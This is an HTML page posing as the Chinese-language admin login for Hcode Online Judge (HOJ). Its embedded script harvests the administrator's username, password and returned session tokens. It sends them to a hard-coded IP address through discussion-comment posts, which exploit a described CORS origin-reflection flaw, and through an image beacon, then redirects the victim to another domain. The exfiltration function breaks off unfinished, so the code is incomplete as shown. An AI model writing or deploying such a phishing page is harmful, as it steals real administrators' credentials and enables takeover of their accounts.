<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>HOJ 管理员登录</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Helvetica Neue',Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}
.login-box{background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.1);padding:40px;width:360px}
.login-box h2{text-align:center;color:#409eff;margin-bottom:30px;font-size:22px}
.login-box .subtitle{text-align:center;color:#999;font-size:13px;margin:-20px 0 20px}
.form-item{margin-bottom:20px}
.form-item label{display:block;color:#606266;font-size:14px;margin-bottom:8px}
.form-item input{width:100%;padding:10px 12px;border:1px solid #dcdfe6;border-radius:4px;font-size:14px;outline:none;transition:border-color .2s}
.form-item input:focus{border-color:#409eff}
.btn{width:100%;padding:12px;background:#409eff;color:#fff;border:none;border-radius:4px;font-size:16px;cursor:pointer}
.btn:hover{background:#66b1ff}
.error-msg{color:#f56c6c;font-size:13px;text-align:center;margin-top:10px;display:none}
.footer{text-align:center;color:#999;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="login-box">
  <h2>HOJ 管理后台</h2>
  <p class="subtitle">Hcode Online Judge Admin Panel</p>
  <div class="form-item">
    <label>用户名</label>
    <input type="text" id="username" placeholder="请输入用户名" autocomplete="username">
  </div>
  <div class="form-item">
    <label>密码</label>
    <input type="password" id="password" placeholder="请输入密码" autocomplete="current-password">
  </div>
  <button class="btn" id="loginBtn" onclick="doLogin()">登 录</button>
  <div class="error-msg" id="errorMsg"></div>
  <div class="footer">Copyright &copy; HOJ Admin</div>
</div>

<script>
// === Configuration ===
var HOJ_API = 'http://129.204.46.135';
var EXFIL_DISCUSSION_ID = 11;  // Discussion to post stolen data as comment
// Also try multiple discussion IDs in case one is deleted
var EXFIL_DIDS = [11, 8, 3, 18];

function doLogin(){
  var u=document.getElementById('username').value;
  var p=document.getElementById('password').value;
  var btn=document.getElementById('loginBtn');
  var err=document.getElementById('errorMsg');

  if(!u||!p){
    err.style.display='block';
    err.textContent='请输入用户名和密码';
    return;
  }

  btn.disabled=true;
  btn.textContent='登录中...';
  err.style.display='none';

  // Step 1: Try real login to get token
  fetch(HOJ_API+'/api/admin/login',{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body:JSON.stringify({username:u,password:p})
  }).then(function(r){
    var authHeader=r.headers.get('Authorization');
    var refreshToken=r.headers.get('refresh-token');
    return r.json().then(function(d){return {data:d,auth:authHeader,refresh:refreshToken};});
  }).then(function(result){
    // Build stolen data package
    var stolen = {
      u: u,
      p: p,
      t: result.auth || '',
      r: result.refresh || '',
      s: result.data.status,
      m: result.data.msg || '',
      time: new Date().toISOString(),
      agent: navigator.userAgent.substring(0, 80)
    };
    var stolenStr = JSON.stringify(stolen);

    // Step 2: Exfiltrate via HOJ CORS vulnerability
    // Method A: Post as comment (CORS reflects any Origin)
    exfilViaComment(stolen);

    // Method B: Also try via Image to webhook as backup
    new Image().src = HOJ_API+'/api/comment?_exfil='+encodeURIComponent(u+':'+p);

    // Step 3: Show result to user
    if(result.data.status === 200){
      err.style.display='block';
      err.style.color='#67c23a';
      err.textContent='登录成功！正在跳转...';
      setTimeout(function(){
        window.location.href='http://xzzai.cn/admin';
      },2000);
    } else {
      err.style.display='block';
      err.style.color='#f56c6c';
      err.textContent=result.data.msg||'用户名或密码错误';
      btn.disabled=false;
      btn.textContent='登 录';
    }
  }).catch(function(e){
    // Even on error, still exfiltrate credentials
    exfilViaComment({u:u, p:p, err:e.message, time:new Date().toISOString()});

    err.style.display='block';
    err.textContent='网络错误，请重试';
    btn.disabled=false;
    btn.textContent='登 录';
  });
}

function exfilViaComment(data){

  // V-01: JwtFilter reflects any Origin -> Access-Control-Allow-Origin
  var encoded = btoa(unescape(encodeURIComponent(JSON.stringify(data))));

  // Try posting as a discussion comment (no auth needed for some endpoints)
  // Use the token from the login attempt if available
  var token = data.t || '';

document.addEventListener('keydown',function(e){
  if(e.key==='Enter')doLogin();
});
</script>
</body>
</html>
